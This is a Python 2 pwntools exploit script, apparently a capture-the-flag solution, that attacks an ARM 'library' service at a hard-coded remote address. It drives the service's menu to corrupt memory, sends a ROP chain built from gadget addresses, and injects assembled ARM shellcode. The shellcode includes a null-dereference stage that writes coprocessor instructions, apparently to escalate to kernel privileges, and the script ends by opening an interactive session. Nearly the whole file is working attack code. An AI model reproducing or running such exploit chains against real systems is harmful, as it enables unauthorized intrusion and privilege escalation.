# 0001b1f8 -> 04400298

from pwn import *
import time

context.update(arch='arm', endian='little')

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '54.214.122.246', 8888
r = remote(HOST, PORT)

time.sleep(2)
target = 0x7fff748
code = asm('''
	mov r4, #0
	mov r3, #0x80000
	a:
	mov r0, #4
	mov r1, sp
	str r4, [sp]
	mov r2, #0x4400000
	svc 0
	add r4, r4, #1
	cmp r0, #0
	beq a
	lsr r3, #1
	cmp r3, #0x200
	bgt a
	b:
	mov r3, #0x30
	mov r1, sp
	str r4, [sp]
	mov r0, #4
	svc 0
	add r4, r4, #1
	cmp r4, #0x4f
	bne b
	mov r4, pc
	b nullderef
	ldr r7, =0x10990
	ldr r0, =0x4000000
	ldr r6, =0x4000100
	stmfd sp!, {r4-r6, pc}
	blx r7
	finished:
	b finished
	nullderef:
	'''
	# 8 ~ 0x28
	'''mov r6, sp
	mov r7, #0
	ldr r8, =0xee111f10
	ldr r9, =0xe2211001
	ldr r10, =0xee011f10
	ldr r11, =0xe12fff34
	str r8, [sp]
	str r9, [sp,#4]
	str r10, [sp,#8]
	str r11, [sp,#12]
	mov r0, #4
	svc 0
	trigger:
	mov r0, #0
	svc 0
	''')
base = 0x6400c68
r6_r7 = lambda x, y: p32(0x4400190) + p32(0) + p32(0) + p32(x) + p32(y) + p32(0) + p32(0)
r11 = lambda x: p32(0x4400ee8) + p32(x)
r1 = lambda x: p32(0x440eb64) + p32(0) + p32(x) + p32(0x440eb60) + p32(0) + p32(0)
syscall = 0x4400008
payload = p32(0) + r1(0x440ce6c) + r6_r7(syscall, len(code)) + r11(target + 132) + p32(0x0440CE5C) + p32(0)
if '\n' in payload or '\r' in payload:
	print `payload`
	exit()
r.send('library\nadd\n1\n1\nm\n\nadd\n1\n1\nm\ncontent\nedit\n0\np\n0\nm\n\nAAAAAAAAAAAA' + p32(target) + p32(target) + p32(0x7fffffff) + p32(base + 12) + code + '\n')
r.send('edit\n1\np\n0\n')
r.send('m\n')
r.send('\n')
r.send(payload + '\n')
raw_input('>> ')
r.send(code)
r.interactive()